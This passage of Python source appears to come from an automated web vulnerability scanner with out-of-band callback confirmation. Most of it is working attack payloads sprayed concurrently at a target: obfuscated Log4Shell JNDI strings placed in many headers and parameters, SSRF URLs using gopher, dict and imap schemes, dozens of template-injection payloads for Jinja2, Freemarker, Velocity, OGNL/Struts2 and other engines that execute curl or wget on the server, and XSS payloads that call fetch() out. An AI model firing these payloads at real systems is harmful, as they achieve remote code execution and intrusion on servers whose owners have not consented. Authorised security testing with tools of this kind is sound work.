        "X-Originating-IP", "True-Client-IP", "X-Remote-IP", "X-Remote-Addr",
    ]
    tasks: List[Callable] = []
    for payload in jndi_payloads:
        for hdr in inject_headers:
            tasks.append(lambda p=payload, h=hdr: _req(base, headers={h: p}, timeout=4.0))
    params = _extract_params(base) or ["q", "search", "username", "email", "message",
                                        "input", "name", "query", "text", "data"]
    for param in params[:6]:
        for payload in jndi_payloads[:5]:
            test = _inject_param(base, param, payload)
            tasks.append(lambda u=test: _req(u, timeout=4.0))
    for payload in jndi_payloads[:4]:
        body = json.dumps({"username": payload, "password": "x"}).encode()
        tasks.append(lambda b=body: _req(base, method="POST", body=b,
                                          headers={"Content-Type": "application/json"}, timeout=4.0))
    with ThreadPoolExecutor(max_workers=min(48, len(tasks))) as ex:
        futs = [ex.submit(t) for t in tasks]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass
    hits = oob_wait(token, timeout=6.0)
    if hits:
        protos = list(dict.fromkeys(h.get("proto", h.get("method", "HTTP")) for h in hits))
        src    = hits[0].get("src", "?")
        path   = hits[0].get("path", "")
        out.append(("Log4Shell OOB confirmed! JNDI/" + "+".join(protos) + " x" + str(len(hits))
                    + " callbacks from " + src + " path=" + path, "token=" + token))
    return out

def scan_oob_imap_ssrf(url: str) -> ScanFindings:
    out: ScanFindings = []
    token = "altssrf" + hashlib.md5(os.urandom(6)).hexdigest()[:8]
    oob_clear(token)
    host   = _OOB_HOST if _OOB_HOST else _local_ip()
    oob_start(); oob_tcp_start(); oob_smtp_start(); oob_ftp_start()
    tcp_p  = _OOB_TCP_PORT  or 45300
    smtp_p = _OOB_SMTP_PORT or 2525
    ftp_p  = _OOB_FTP_PORT  or 2121
    scheme_urls = [
        "imap://"   + host + ":" + str(tcp_p)  + "/" + token,
        "smtp://"   + host + ":" + str(smtp_p) + "/" + token,
        "ftp://"    + token + "@" + host + ":" + str(ftp_p) + "/",
        "dict://"   + host + ":" + str(tcp_p)  + "/" + token,
        "gopher://" + host + ":" + str(tcp_p)  + "/1" + token,
    ]
    params = _extract_params(url) or ["url", "uri", "dest", "redirect", "target",
                                       "callback", "webhook", "fetch", "load", "src",
                                       "proxy", "resource", "endpoint"]
    tasks: List[Callable] = []
    for param in params[:6]:
        for cb in scheme_urls:
            u = _inject_param(url, param, cb)
            tasks.append(lambda u=u: _req(u, timeout=3.0))
    with ThreadPoolExecutor(max_workers=10) as ex:
        for fn in tasks:
            ex.submit(fn)
    hits_map = oob_wait_any([token], timeout=6.0)
    for tok_hits in hits_map.values():
        for h in tok_hits:
            scheme = h.get("proto", h.get("method", "unknown")).lower()
            out.append((
                "alternative-scheme SSRF: " + scheme + " callback received from " + h.get("src", "?"),
                url,
            ))
            break
    return out

def scan_oob_log4shell_headers(url: str) -> ScanFindings:
    out: ScanFindings = []
    token = "l4jh" + hashlib.md5(os.urandom(6)).hexdigest()[:8]
    oob_clear(token)
    urls_map = oob_url_all(token, url)
    if not urls_map:
        return out
    host   = _OOB_HOST if _OOB_HOST else _local_ip()
    http_p = _OOB_PORT     or oob_start()
    tcp_p  = _OOB_TCP_PORT or oob_tcp_start()
    h_http = host + ":" + str(http_p) + "/" + token
    h_tcp  = host + ":" + str(tcp_p)  + "/" + token
    protocols: Dict[str, str] = {
        "ldap":  h_tcp,
        "ldaps": h_tcp,
        "rmi":   h_tcp,
        "dns":   oob_url_dns(token),
        "corba": h_tcp,
        "iiop":  h_tcp,
    }
    payloads: List[str] = []
    for proto, dest in protocols.items():
        payloads.append("${jndi:" + proto + "://" + dest + "}")
        payloads.append("${${lower:j}ndi:${lower:" + proto[0] + "}" + proto[1:] + "://" + dest + "}")
        payloads.append("${${env:NaN:-j}ndi:${env:NaN:-" + proto + "}://" + dest + "}")
        payloads.append("${j${::-n}di:" + proto + "://" + dest + "}")
        payloads.append(
            "${"
            + "".join("${::-%s}" % c for c in "jndi")
            + ":"
            + "".join("${::-%s}" % c for c in proto)
            + "://" + dest + "}"
        )
    inject_headers = [
        "User-Agent", "X-Forwarded-For", "X-Forwarded-Host", "X-Api-Version",
        "Referer", "X-Real-IP", "X-Client-IP", "CF-Connecting-IP",
        "X-Originating-IP", "Origin", "Accept-Language", "Authorization",
        "X-Request-ID", "X-Correlation-ID",
    ]

    def _spray(hdr: str, payload: str) -> None:
        _req(url, headers={hdr: payload}, timeout=3.0)

    with ThreadPoolExecutor(max_workers=20) as ex:
        futs = [ex.submit(_spray, h, p) for h in inject_headers for p in payloads]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass
    hits_map = oob_wait_any([token], timeout=8.0)
    for tok_hits in hits_map.values():
        for h in tok_hits:
            proto = h.get("proto", h.get("method", "?"))
            out.append((
                "Log4Shell header injection: " + proto + " callback from " + h.get("src", "?"),
                "token=" + token + " method=" + h.get("method", "?"),
            ))
    return out

def scan_ssti_oob(url: str) -> ScanFindings:
    out: ScanFindings = []
    token = "ssti" + hashlib.md5(os.urandom(6)).hexdigest()[:10]
    cb = oob_url(token, url)
    if not cb:
        return out
    oob_clear(token)
    params = _extract_params(url) or ["template", "view", "page", "name", "q",
                                       "tpl", "render", "body", "text", "subject",
                                       "content", "msg", "greeting", "lang", "format"]
    _WG = "wget -q -O /dev/null "
    _SSTI_OOB_PAYLOADS: List[Tuple[str, str]] = [
        ("{{''.__class__.__mro__[1].__subclasses__()[407](['curl','" + cb + "'],stdout=-1).communicate()[0]}}", "jinja2-subprocess"),
        ("{{request.application.__globals__.__builtins__.__import__('os').popen('curl " + cb + "').read()}}", "jinja2-popen"),
        ("{{lipsum.__globals__.os.popen('curl " + cb + "').read()}}", "jinja2-lipsum"),
        ("{{lipsum.__globals__.os.popen('" + _WG + cb + "').read()}}", "jinja2-wget"),
        ("{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('curl " + cb + "')}}", "jinja2-subclass59"),
        ("{{''.__class__.__mro__[1].__subclasses__()[396]('curl " + cb + "',shell=True,stdout=-1).communicate()[0]}}", "jinja2-subprocess396"),
        ("{{range.constructor('return process')().mainModule.require('child_process').execSync('curl " + cb + "').toString()}}", "nunjucks-constructor"),
        ("{{range.constructor('return process')().mainModule.require('child_process').execSync('" + _WG + cb + "').toString()}}", "nunjucks-wget"),
        ("<%=require('child_process').execSync('curl " + cb + "').toString()%>", "ejs-require"),
        ("<%=global.process.mainModule.require('child_process').execSync('curl " + cb + "')%>", "ejs-global"),
        ("<%- require('child_process').execSync('curl " + cb + "') %>", "ejs-print"),
        ("#{require('child_process').execSync('curl " + cb + "')}", "pug-require"),
        ("${__import__('os').popen('curl " + cb + "').read()}", "mako-popen"),
        ("${__import__('os').popen('" + _WG + cb + "').read()}", "mako-wget"),
        ("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('curl " + cb + "')}", "freemarker"),
        ("${\"freemarker.template.utility.Execute\"?new()(\"curl " + cb + "\")}", "freemarker-short"),
        ("<#assign cl=object-api.class><#assign c=cl.forName(\"java.lang.ProcessBuilder\")><#assign b=c-api.getDeclaredConstructors()[0].newInstance([[\"curl\",\"" + cb + "\"]])><#assign p=b.start()>${p.waitFor()}", "freemarker-pb"),
        ("#set($rt=''.class.forName('java.lang.Runtime'))#set($e=$rt.getRuntime().exec('curl " + cb + "'))$e", "velocity-exec"),
        ("#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('" + _WG + cb + "'))$ex", "velocity-wget"),
        ("#set($e=''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'curl " + cb + "'))#set($out=$e.text)$out", "velocity-alt"),
        ("<%= `curl " + cb + "` %>", "erb-ruby"),
        ("<%= IO.popen('curl " + cb + "').read %>", "erb-io"),
        ("{php}system('curl " + cb + "');{/php}", "smarty-php"),
        ("{system('curl " + cb + "')}", "smarty-exec"),
        ("{% set x = range.__class__.__mro__[1].__subclasses__()%}{{x[407](['curl','" + cb + "'],stdout=-1).communicate()}}", "twig-mro"),
        ("{{['curl','" + cb + "']|map('system')|join}}", "twig-map"),
        ("__${T(java.lang.Runtime).getRuntime().exec('curl " + cb + "')}__::.x", "thymeleaf"),
        ("*{T(java.lang.Runtime).getRuntime().exec('curl " + cb + "')}", "thymeleaf-spel"),
        ("${Runtime.exec('curl " + cb + "')}", "groovy-gsp"),
        ("@(Runtime.exec(new String[]{'curl','" + cb + "'}))", "razor-dotnet"),
        ("#{T(java.lang.Runtime).getRuntime().exec('curl " + cb + "')}", "spring-spel"),
        ("{{= process.mainModule.require('child_process').execSync('curl " + cb + "').toString() }}", "pebble-node"),
        ("%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess-(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='curl " + cb + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin-{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}", "ognl-struts2"),
    ]
    _SSTI_OOB_HEADERS = [
        "User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP",
        "X-Forwarded-Host", "Accept-Language",
    ]
    tasks: List[Tuple[str, str, str]] = []
    for param in params[:10]:
        for pay, label in _SSTI_OOB_PAYLOADS:
            tasks.append((param, label, _inject_param(url, param, pay)))
        for pay, label in _SSTI_OOB_PAYLOADS[:12]:
            tasks.append((param, label + "?POST",
                          url + "||POST||" + urllib.parse.urlencode({param: pay})))
    for hdr in _SSTI_OOB_HEADERS:
        for pay, label in _SSTI_OOB_PAYLOADS[:14]:
            tasks.append(("__hdr__" + hdr, label + "?hdr", url + "||HDR||" + hdr + "||" + pay))
    def _run_task(t: tuple) -> None:
        _, label, target = t
        if "||POST||" in target:
            u, _, data = target.partition("||POST||")
            _req(u, method="POST", data=data.encode(),
                 content_type="application/x-www-form-urlencoded", timeout=5.0)
        elif "||HDR||" in target:
            u, _, rest = target.partition("||HDR||")
            hdr_name, _, hdr_val = rest.partition("||")
            _req(u, headers={hdr_name: hdr_val}, timeout=5.0)
        else:
            _req(target, timeout=5.0)
    with ThreadPoolExecutor(max_workers=min(32, len(tasks))) as ex:
        futs = [ex.submit(_run_task, t) for t in tasks]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass
    hits = oob_wait(token, timeout=6.0)
    if hits:
        src  = hits[0].get("src", "?")
        path = hits[0].get("path", "")
        out.append(("[CONFIRMED] SSTI OOB - server executed template payload (callback from "
                    + src + " path=" + path + ")", "token=" + token))
    return out

def scan_xss_context_aware(url: str) -> ScanFindings:
    out: ScanFindings = []
    token = "xss" + hashlib.md5(os.urandom(6)).hexdigest()[:8]
    cb = oob_url(token)

    params = _extract_params(url) or ["q", "search", "name", "input", "query", "s"]
    context_payloads = [
        ('<img src=x onerror=fetch("' + (cb or "http://x.x") + '")>',       "html-tag"),
        ('<svg onload=fetch("' + (cb or "http://x.x") + '")>',               "html-tag"),
        ('" onfocus=fetch("' + (cb or "http://x.x") + '") autofocus x="',   "attr"),
        ("' onfocus=fetch('" + (cb or "http://x.x") + "') autofocus x='",   "attr-single"),
        ("';fetch('" + (cb or "http://x.x") + "')//",                        "js-string-single"),
        ('";fetch("' + (cb or "http://x.x") + '")//;',                       "js-string-double"),
        ("`+fetch(`" + (cb or "http://x.x") + "`)+`",                        "template-literal"),
    ]
    harmless_probes = [
        ('">', "html-tag"),
        ("\"'><", "tag-break"),
        ("';\"", "js-string"),
        ("${7*7}", "template"),
    ]
    for param in params[:4]:
        c0, _, b0, _ = _req(url)
        body0 = b0.decode("utf-8", "ignore")
        context = "unknown"
        for probe, ctx_hint in harmless_probes:
            test = _inject_param(url, param, probe)
            c, _, b, _ = _req(test)
            body = b.decode("utf-8", "ignore")
            if probe in body:
                context = ctx_hint
                break
        if context == "unknown":
            continue
        for pay, pay_ctx in context_payloads:
            if pay_ctx not in context and context not in pay_ctx:
                continue
            if cb:
                oob_clear(token)
            test = _inject_param(url, param, pay)
            c, _, b, _ = _req(test)
            body = b.decode("utf-8", "ignore")
            if cb:
                hits = oob_wait(token, timeout=4.0)
                if hits:
                    out.append(("XSS confirmed via OOB fetch() callback on param '" + param
                                + "' (context=" + context + ")", pay[:120]))
                    return out
            escaped = re.sub(r"[<>\"']", "", pay)
            safe_portion = pay.split("fetch")[0] if "fetch" in pay else pay[:20]
            if safe_portion and safe_portion.strip('" \'><') in body:
                out.append(("reflected XSS in " + context + " context on param '" + param + "'", pay[:120]))
                break
    return out



_ASSIGN_PAT = re.compile(
    r'(?:^|[;{\n])\s*(?:var|let|const)?\s*([A-Za-z_$][\w$]*)\s*'
    r'=\s*([^;,\n]{3,120})',
    re.MULTILINE,
)
_PROP_ASSIGN_PAT = re.compile(
    r'([A-Za-z_$][\w$]*)\s*=\s*([^;,\n]{3,120})',
    re.MULTILINE,
)
_CALL_ASSIGN_PAT = re.compile(
    r'(?:var|let|const)\s+([A-Za-z_$][\w$]*)\s*=\s*'
    r'(?:[A-Za-z_$][\w$.]*\s*\()([^)]{0,80})',
    re.MULTILINE,
)

def _extract_js_files(base: str, body: str) -> List[Tuple[str, str]]:
    base_parsed = urllib.parse.urlparse(base)
    origin = base_parsed.scheme + "://" + base_parsed.netloc
    inline = re.findall(r'<script[^>]*>(.*?)</script>', body, re.IGNORECASE | re.DOTALL)
    sources: List[Tuple[str, str]] = [("[inline]", "\n".join(inline))]
    srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', body, re.IGNORECASE)
    for src in srcs[:10]:
        if src.startswith("//"):
            full = base_parsed.scheme + ":" + src
        else:
            full = urllib.parse.urljoin(origin + "/", src.lstrip("/"))
        if urllib.parse.urlparse(full).hostname != base_parsed.hostname:
            continue
        jc, _, jb, _ = _req(full, timeout=8.0)
        if jc == 200 and len(jb) < 3 * 1024 * 1024:
            sources.append((src, jb.decode("utf-8", "ignore")))
    return sources

